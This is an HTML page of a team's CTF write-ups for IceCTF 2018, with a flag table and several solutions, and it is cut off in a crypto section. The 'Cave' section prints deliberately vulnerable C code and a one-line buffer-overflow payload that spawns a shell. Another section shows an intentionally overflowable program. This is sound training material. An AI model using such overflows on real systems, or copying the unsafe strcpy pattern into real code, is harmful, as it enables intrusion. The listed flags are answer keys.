<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="IceCTF 2018" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/IceCTF-2018/" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/IceCTF-2018/" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-09-06T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="IceCTF 2018" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-17T20:19:52+02:00","datePublished":"2018-09-06T00:00:00+02:00","description":"A set of CTF writeups by team Galaxians.","headline":"IceCTF 2018","mainEntityOfPage":{"@type":"WebPage","@id":"https://shiltemann.github.io/CTF-writeups-public/writeups/IceCTF-2018/"},"url":"https://shiltemann.github.io/CTF-writeups-public/writeups/IceCTF-2018/"}</script><title> Galaxians CTF | IceCTF 2018</title><link rel="apple-touch-icon" sizes="180x180" href="/CTF-writeups-public/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/CTF-writeups-public/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/CTF-writeups-public/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/CTF-writeups-public/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/CTF-writeups-public/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/CTF-writeups-public/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/CTF-writeups-public/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/CTF-writeups-public/" class="mx-auto"> <img src="/CTF-writeups-public/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/CTF-writeups-public/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/CTF-writeups-public/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/posts/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/CTF-writeups-public/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/CTF-writeups-public/"> Home </a> </span> <span>IceCTF 2018</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Ctf-event</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> IceCTF 2018</h1><p>2-Week-long Icelandic CTF in September 2018</p><div class="post-content"><h1>Overview</h1><div class="table-wrapper"><div class="table-wrapper"><table><thead><tr><th>Challenge<th>Points<th>Category<th>Flag<tbody><tr><td><a href="#cave">Cave</a><td>50<td>binary<td><code>IceCTF{i_dont_think_caveman_overflowed_buffers}</code><tr><td><a href="#simple-overflow">Simple Overflow</a><td>200<td>binary<td> unsolved<tr><td><a href="#twitter">Twitter</a><td>800<td>binary<td> unsolved<tr><td><a href="#garfeld">garfeld</a><td>100<td>crypto<td><code>IceCTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS}</code><tr><td><a href="#posted">Posted!</a><td>250<td>crypto<td> unsolved<tr><td><a href="#ancient-foreign-communications">Ancient Foreign Communications</a><td>300<td>crypto<td><code>IceCTF{squeamish ossifrage}</code><tr><td><a href="#think-outside-the-key">Think outside the key</a><td>400<td>crypto<td> unsolved<tr><td><a href="#modern-picasso">Modern Picasso</a><td>150<td>forensics<td><code>IceCTF{wow_fast}</code><tr><td><a href="#hard-shells">Hard Shells</a><td>200<td>forensics<td><code>IceCTF{look_away_i_am_hacking}</code><tr><td><a href="#lost-in-the-forest">Lost in the Forest</a><td>300<td>forensics<td><code>IceCTF{good_ol_history_lesson}</code><tr><td><a href="#hello-world">Hello World!</a><td>10<td>misc<td><code>IceCTF{this_is_a_flag}</code><tr><td><a href="#ilovebees">ilovebees</a><td>200<td>misc<td><code>IceCTF{MY_FAVORITE_ICON}</code><tr><td><a href="#anticaptcha">anticaptcha</a><td>250<td>misc<td><code>IceCTF{ahh_we_have_been_captchured}</code><tr><td><a href="#secret-recipe">Secret Recipe</a><td>300<td>misc<td> unsolved<tr><td><a href="#locked-out">Locked out</a><td>200<td>reversing<td> unsolved<tr><td><a href="#passworded">Passworded!</a><td>400<td>reversing<td> unsolved<tr><td><a href="#poke-a-mango">Poke-A-Mango</a><td>250<td>reversing<td> unsolved<tr><td><a href="#drumbone">Drumbone</a><td>150<td>stegano<td><code>IceCTF{Elliot_has_been_mapping_bits_all_day}</code><tr><td><a href="#hot-or-not">Hot or Not</a><td>300<td>stegano<td><code>IceCTF{h0td1gg1tyd0g}</code><tr><td><a href="#rabbit-hole">Rabbit Hole</a><td>400<td>stegano<td><code>IceCTF{if_you_see_this_youve_breached_my_privacy}</code><tr><td><a href="#friðfinnur">Friðfinnur</a><td>200<td>web<td><code>IceCTF{you_found_debug}</code><tr><td><a href="#history-of-computing">History of Computing</a><td>350<td>web<td> unsolved<tr><td><a href="#toke-relaunch">Toke Relaunch</a><td>50<td>web<td><code>IceCTF{what_are_these_robots_doing_here}</code><tr><td><a href="#ligths-out">Ligths out</a><td>75<td>web<td><code>IceCTF{styles_turned_the_lights}</code></table></div></div><h1 id="cave"> Cave <a href="/CTF-writeups-public/writeups/IceCTF-2018/binare-exploit-50-cave.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You stumbled upon a cave! I’ve heard some caves hold secrets.. can you find the secrets hidden within its depths?</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh -i"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">message</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"The cave echoes.. %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
        <span class="n">message</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: ./shout &lt;message&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Another buffer overflow challenge, this time we need to overwrite the return address to call the <code class="language-plaintext highlighter-rouge">shell()</code> function. First we need to find out what that address should be, we can do this with gdb’s <code class="language-plaintext highlighter-rouge">info functions shell</code> or <code class="language-plaintext highlighter-rouge">objdump -d ./shout | grep shell</code> and find out that the address is <code class="language-plaintext highlighter-rouge">0x0804850b</code></p><p>So we need to overwrite the return address with this address, in little endian order:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./shout `python -c "print('a'*28+'\x0b\x85\x04\x08')"`
</pre></table></code></div></div><p>this gives us a root shell and we can read the contents of <code class="language-plaintext highlighter-rouge">flag.txt</code> to read our flag:</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{i_dont_think_caveman_overflowed_buffers}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{i_dont_think_caveman_overflowed_buffers} </code><hr><h1 id="simple-overflow"> Simple Overflow <a href="/CTF-writeups-public/writeups/IceCTF-2018/binary-exploit-200-simple-overflow.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In programming, a buffer overflow is a case where a program, while it is writing data somewhere, overruns the boundary and begins overwriting adjacent memory. This is one of the first vulnerabilities used to exploit software. Modern programming languages tend to provide protection against this type of vulnerability, but it is still observed commonly in low-level software.</p><p>Buffer overflows can be a complex vulnerability to understand and exploit due to their low-level nature. To assist you in your training, we have provided a memory simulation in the middle to help you understand what happens when your input in the textbox is passed to the program on the left. The simulation shows you the memory layout of the underlying process, where your buffer is red, and the secret value is green. Try entering values into the box and observe how the values that the program sees change on the left.</p><p>In this case, the buffer sits on top of the stack memory, with the variable secret sitting just below it. As you will observe, the size limitation placed on buffer is not enforced, allowing you to write more than 16 characters. Get a feel for buffer overflows by exploring the above code.</p><p>Once you are comfortable with buffer overflows, exploit the program to grant you the flag.</p><p><a href="writeupfiles/overflow.c">overflow.c</a></p><h2 id="instructions"><span class="mr-2">Instructions</span><a href="#instructions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li><p>Hello world! In the textbox in the middle, try entering Hello World!. Observe which variable within the code takes the value.</p><li><p>Overflow! What happens if you write more than 16 characters into the buffer? Can you make the secret change?</p><li><p>Take control Can you make secret take the value 1633771873 (0x61616161). Note that strings are stored in ASCII, and in ASCII, character number 0x61 is a.</p><li><p>Little endian In most architectures, integers are read in reverse byte order from memory, in a method which is called Little endian. Can you make the secret take the value 1633837924 (0x61626364)?</p><li><p>Escape from ASCII As you may see in the code, to get past the restrictions and retrieve the flag, secret needs to have a value of 0xcafebabe. However not all these characters are in ASCII! What will you do?</p></ol><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We examine the source code</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">FLAG</span> <span class="o">=</span> <span class="s">"&lt;REDACTED&gt;"</span>

<span class="kt">void</span> <span class="nf">flag</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"FLAG: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">message</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>

    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"You said: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xcafebabe</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">flag</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"The secret is 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">){</span>
        <span class="n">message</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: ./overflow &lt;message&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="twitter"> Twitter <a href="/CTF-writeups-public/writeups/IceCTF-2018/binary-exploit-800-twitter.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Someone left a time machine in the basement with classic games from the 1970s. Let me play these on the job, nothing can go wrong.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh -p 2222 ssh.icec.tf -l gg4ugw5xbsr2myw-twitter
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="garfeld"> garfeld <a href="/CTF-writeups-public/writeups/IceCTF-2018/cryptography-100-garfeld.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You found the marketing campaign for a brand new sitcom. Garfeld! It has a secret message engraved on it. Do you think you can figure out what they’re trying to say?</p><p><img src="writeupfiles/garfeld.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The image reads:</p><p><code class="language-plaintext highlighter-rouge">IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}</code></p><p>Looks like the flag but encrypted somehow</p><p>Turns out to be vigenere with key <code class="language-plaintext highlighter-rouge">ahchbjhi</code></p><p>we later realized that the <code class="language-plaintext highlighter-rouge">07271978</code> at the top of the image is a hint for this key with A=0,B=1 etc</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS} </code><hr><h1 id="posted"> Posted! <a href="/CTF-writeups-public/writeups/IceCTF-2018/cryptography-250-posted.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Apparently some bitwise boi is posting flags all over the place. He gave us a hint, though.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>DychGDZJRRsEUTI0JDViVlxeZyFIBCM7MwosGRQCMCgZJCIrGCsoRkFIajcSKhBTGx9XeTV4MDlZB1Y=
</pre></table></code></div></div><p>He also gave us another hint: 41</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>base64 decode, then probably one or more bitwise operation (due to mention of ‘bitwise boi’ in description), likely involving the number 41</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="ancient-foreign-communications"> Ancient Foreign Communications <a href="/CTF-writeups-public/writeups/IceCTF-2018/cryptography-300-ancient-foreign-communications.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> We got word from a friend of ours lost in the depths of the Andorran jungles! Help us figure out what he is trying to tell us before its too late!</p><p>Note: The flag here is non-standard, in the result you should end up with some words! The flag is IceCTF{&lt;words, lowercase, including spaces&gt;}</p><p><strong>Solution</strong> We’re given a file with hex bytes, we can use <code class="language-plaintext highlighter-rouge">xxd</code> to covnert that into the appropriate characters/bytes:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>xxd -r -p comms.txt &gt; out.txt
</pre></table></code></div></div><p>Which is full of some fun symbols?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>⨅]]⌞⌞⌟[⨆]⌟]]]⨆⨆⨆⌜[[[⌝⌝⌝⌞⌝⌝⌝⌝⨆⌝⌝⌝⌞⌞⌝⌝⌝⌝⌟⌝⌝⨅⨅⌞⌞⨆[]]]⌝⌝⌝⌝]]⌟[[[⌝⌝⌝⌝⌟⌝⌝⌝⌝]]]⌞⌞⌞⌝⌝⌝⨆]⌞⌞
</pre></table></code></div></div><p>combining pigpen cipher with T9 we translate this to:</p><p><img src="writeupfiles/pigpen.png" alt="" /> <img src="writeupfiles/T9.jpeg" alt="" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>⨅ ]] ⌞⌞ ⌟ [ ⨆ ] ⌟ ]]] ⨆⨆⨆ ⌜ [[[ ⌝⌝⌝ ⌞ ⌝⌝⌝⌝ ⨆ ⌝⌝⌝ ⌞⌞ ⌝⌝⌝⌝ ⌟ ⌝⌝ ⨅⨅ ⌞⌞ ⨆ [ ]]] ⌝⌝⌝⌝ ]] ⌟ [[[ ⌝⌝⌝⌝ ⌟ ⌝⌝⌝⌝ ]]] ⌞⌞⌞ ⌝⌝⌝ ⨆ ] ⌞⌞
t h  e  _ m a g _ i   c   w o   r   d s    a r   e  s    _ q  u  e  a m i   s    h  _ o   s    _ s    i   f   r   a g e
</pre></table></code></div></div><p>method explained:</p><ul><li><code class="language-plaintext highlighter-rouge">⨅</code> in pigpen would signify <code class="language-plaintext highlighter-rouge">H</code>, when we instead combine this with T9, it would mean the letter <code class="language-plaintext highlighter-rouge">t</code> (one press on the number <code class="language-plaintext highlighter-rouge">8</code>)<li><code class="language-plaintext highlighter-rouge">]]</code> would be the <code class="language-plaintext highlighter-rouge">dd</code> in classic pigpen, but now signifies 2 presses on the number <code class="language-plaintext highlighter-rouge">4</code>, which would be an <code class="language-plaintext highlighter-rouge">h</code><li><code class="language-plaintext highlighter-rouge">⌞⌞</code> is two presses on the 3, so a letter <code class="language-plaintext highlighter-rouge">e</code><li>etc</ul><p>This gives us the sentence</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>the magic words are squeamish ossifrage
</pre></table></code></div></div><p>Which was the solution to a challenge ciphertext set by the inventor of RSA in 1977 (<a href="https://en.wikipedia.org/wiki/The_Magic_Words_are_Squeamish_Ossifrage">link</a>)</p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>IceCTF{squeamish ossifrage}
</pre></table></code></div></div><h2> Flag</h2><code> IceCTF{squeamish ossifrage} </code><hr><h1 id="think-outside-the-key"> Think outside the key <a href="/CTF-writeups-public/writeups/IceCTF-2018/cryptography-400-think-outside-the-key.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Estelle was messing around with her computer and she ended up outputting some garbage! Could you figure out what this means?!</p><p>Note: The flag is of the format <code class="language-plaintext highlighter-rouge">IceCTF{&lt;text&gt;}</code> where <code class="language-plaintext highlighter-rouge">&lt;text&gt;</code> is the decrypted text.</p><p><a href="writeupfiles/mess.txt">mess.txt</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>iâ‡§fjag8â‡§qvâ‡§qy4â‡§dag8k0qâ‡§ptag86â‡§sâ‡§hecâ‡§lâ‡§c4ag8z3ssag8â‡§q7y66b
